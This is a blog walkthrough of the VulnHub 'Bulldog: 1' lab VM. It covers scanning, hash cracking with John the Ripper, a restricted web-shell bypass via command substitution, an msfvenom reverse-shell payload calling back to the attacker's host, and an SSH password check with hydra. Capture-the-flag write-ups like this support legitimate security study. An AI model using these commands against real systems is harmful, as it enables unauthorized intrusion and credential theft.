---
layout: post
title: "Who Let the Dogs Out?"
category: Walkthrough
tags: [VulnHub, Bulldog]
comments: true
---

This post documents the complete walkthrough of Bulldog: 1, a boot2root [VM][1] hosted at [VulnHub][2]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background
Bulldog Industries recently had its website defaced and owned by the malicious German Shepherd Hack Team. Could this mean there are more vulnerabilities to exploit? Why don't you find out? :) 

### Information Gathering

Let's kick this off with a `nmap` scan to establish the services available in **bulldog**:

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.36.3
...
PORT     STATE SERVICE REASON         VERSION
23/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 20:8b:fc:9e:d9:2e:28:22:6b:2e:0e:e3:72:c5:bb:52 (RSA)
|_  256 cd:bd:45:d8:5c:e4:8c:b6:91:e5:39:a9:66:cb:d7:98 (ECDSA)
80/tcp   open  http    syn-ack ttl 64 WSGIServer 0.1 (Python 2.7.12)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: WSGIServer/0.1 Python/2.7.12
|_http-title: Bulldog Industries
8080/tcp open  http    syn-ack ttl 64 WSGIServer 0.1 (Python 2.7.12)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: WSGIServer/0.1 Python/2.7.12
|_http-title: Bulldog Industries
```

Let's explore the web service first. This is how the site looked like as rendered by a browser.

![screenshot-1](/assets/images/posts/bulldog-walkthrough/screenshot-1.png)

The HTML source of the landing page as well as its internal link did not provide a clue on how to proceed.

### Directory/File Enumeration

Let's use `gobuster` with `common.txt` from [SecLists][3]{:target='blank'} to enumerate the site and see what we can discover.

```
# gobuster -w /usr/share/seclists/Discovery/Web_Content/common.txt -e -u http://192.168.36.3

Gobuster v1.1                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.36.3/
[+] Threads      : 10
[+] Wordlist     : /usr/share/seclists/Discovery/Web_Content/common.txt
[+] Status codes : 204,301,302,307,200
[+] Expanded     : true
=====================================================
http://192.168.36.3/admin (Status: 301)
http://192.168.36.3/dev (Status: 301)
http://192.168.36.3/robots.txt (Status: 200)
=====================================================
```

The `robots.txt` probably doesn't conform to specifications or it'll will appear in the `nmap` scan. Now, I've two more new pages: **Django Administration** and **Under Development**.

### Under Development Page

This page contained interesting information. There's a link to `/dev/shell`, purportedly a web shell. Under the hood in the HTML source, there were SHA1 password hashes of members from the development team.

![screenshot-2](/assets/images/posts/bulldog-walkthrough/screenshot-2.png)

Let's clean up the hashes and submit to John the Ripper for offline cracking.

```
# curl -s 192.168.36.3/dev/ | sed '49,55!d' | awk -F': ' '{ print $2 }' | sed -r -e 's/(<br>)+<!--/:/' -e 's/-->/:::::/' > hashes.txt && john --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
...
nick@bulldogindustries.com:bulldog:::::
sarah@bulldogindustries.com:bulldoglover:::::
```

Thank goodness authentication is required to use the web shell.

![screenshot-3](/assets/images/posts/bulldog-walkthrough/screenshot-3.png)

### Django Site Administration

Let's use one of the credentials `(nick:bulldog)` and see if we can authenticate with the server in order to use the web shell.

![screenshot-4](/assets/images/posts/bulldog-walkthrough/screenshot-4.png)

![screenshot-5](/assets/images/posts/bulldog-walkthrough/screenshot-5.png)

We see that a session with the site has been established. Now, are we able to use the web shell by going to `/dev/shell`?

![screenshot-6](/assets/images/posts/bulldog-walkthrough/screenshot-6.png)

Sweet. However, it appeared that only certain commands were allowed.

### Command Substitution

One of my favorite features in `bash` is [command substitution][4]{:target='_blank'} using backtick (`).

> "Bash performs the expansion by executing command in a subshell environment and replacing the command substitution with the standard output of the command, with any trailing newlines deleted."

![screenshot-7](/assets/images/posts/bulldog-walkthrough/screenshot-7.png)

### Low Privilege Shell

Let's transfer (using `wget`) a single-stage reverse shell payload and then run a reverse shell back to me. I can do that with `msfvenom` and Metasploit multi-handler.

```
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.36.4 LPORT=443 -f elf -o bulldog
```

![screenshot-8](/assets/images/posts/bulldog-walkthrough/screenshot-8.png)

![screenshot-9](/assets/images/posts/bulldog-walkthrough/screenshot-9.png)

![screenshot-10](/assets/images/posts/bulldog-walkthrough/screenshot-10.png)

Boom. A low-privilege shell appeared but let's spawn a pseudo-TTY for better output control.

![screenshot-11](/assets/images/posts/bulldog-walkthrough/screenshot-11.png)

### Privilege Escalation

During enumeration, I found two users: `django` and `bulldogadmin` able to `sudo` as `root`. Unfortunately, I don't have their passwords.

![screenshot-12](/assets/images/posts/bulldog-walkthrough/screenshot-12.png)

![screenshot-13](/assets/images/posts/bulldog-walkthrough/screenshot-13.png)

![screenshot-14](/assets/images/posts/bulldog-walkthrough/screenshot-14.png)

Noticed `.hiddenadmindirectory` in the home directory of `bulldogadmin`?

![screenshot-15](/assets/images/posts/bulldog-walkthrough/screenshot-15.png)

![screenshot-16](/assets/images/posts/bulldog-walkthrough/screenshot-16.png)

![screenshot-17](/assets/images/posts/bulldog-walkthrough/screenshot-17.png)

Seemed like reverse engineering the ELF binary is my ticket to `root`.

### What the ELF?

The first thing to do in reverse engineering is to look for interesting strings and that's exactly what I did.

![screenshot-18](/assets/images/posts/bulldog-walkthrough/screenshot-18.png)

If you look past `"H"`, you'll see "`SUPERultimatePASSWORDyouCANTget`". I'll hit the jackpot if this is the password belonging to any of the users since they can all `sudo` to `root`. Let's find out with `hydra`.

```
# cat users.txt
bulldogadmin
django
root

# hydra -L users.txt -p SUPERultimatePASSWORDyouCANTget -s 23 ssh://192.168.36.3
[23][ssh] host: 192.168.36.3   login: django   password: SUPERultimatePASSWORDyouCANTget
1 of 1 target successfully completed, 1 valid password found
```

![screenshot-19](/assets/images/posts/bulldog-walkthrough/screenshot-19.png)

It's done.

![screenshot-20](/assets/images/posts/bulldog-walkthrough/screenshot-20.png)

:dancer:

### Afterthought

If I have to guess, I'll say the other way to get root is perhaps through the Dirty CoW exploit as hinted in the notice page.

![screenshot-21](/assets/images/posts/bulldog-walkthrough/screenshot-21.png)

Well, to an attacker, a shell is a shell is a shell. Period. :smiling_imp:

[1]: https://www.vulnhub.com/entry/bulldog-1,211/
[2]: https://www.vulnhub.com
[3]: https://github.com/danielmiessler/SecLists
[4]: https://www.gnu.org/s/bash/manual/html_node/Command-Substitution.html